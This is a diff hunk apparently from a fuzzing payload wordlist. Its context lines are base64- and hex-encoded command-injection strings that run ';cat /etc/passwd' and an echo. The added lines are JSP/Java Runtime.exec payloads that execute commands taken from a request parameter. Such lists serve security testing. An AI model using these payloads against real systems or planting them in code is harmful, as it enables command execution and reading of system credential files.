@@ -947,3 +947,5 @@ O2NhdCAvZXRjL3Bhc3N3ZA==
 3b636174202f6574632f706173737764
 ZWNobyAiMTMzNyI=
 6563686f20223133333722
+<%Runtime.getRuntime().exec(request.getParameter("cat /etc/passwd"))%>
+Runtime.getRuntime().exec(request.getParameter("cat /etc/passwd"))
